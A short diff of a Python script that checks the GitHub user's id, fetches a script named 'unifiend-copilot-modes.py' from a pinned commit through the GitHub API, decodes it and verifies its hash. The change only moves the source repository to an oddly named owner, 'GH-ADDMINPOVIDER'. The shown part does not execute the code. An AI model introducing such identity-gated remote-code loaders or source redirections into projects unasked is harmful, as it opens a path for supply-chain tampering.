@@ -38,7 +38,7 @@ try:
             return json.load(response)
     if request('https://api.github.com/user').get('id') != 342175560:
         raise ValueError('OPERATIONAL_PRINCIPAL_MISMATCH')
-    data = request('https://api.github.com/repos/Wave-Runner-2/Build-Platform/contents/scripts/unifiend-copilot-modes.py?ref=25c087018e6359082ba2178e05a3e5dc1f30e850')
+    data = request('https://api.github.com/repos/GH-ADDMINPOVIDER/Build-Platform/contents/scripts/unifiend-copilot-modes.py?ref=25c087018e6359082ba2178e05a3e5dc1f30e850')
     source = base64.b64decode(data['content'])
     if hashlib.sha256(source).hexdigest() != '8f5dda0723d3008fd807ecafd20548ee7e05ad960be790c3d14b36a87d48733e':
         raise ValueError('SOURCE_MISMATCH')
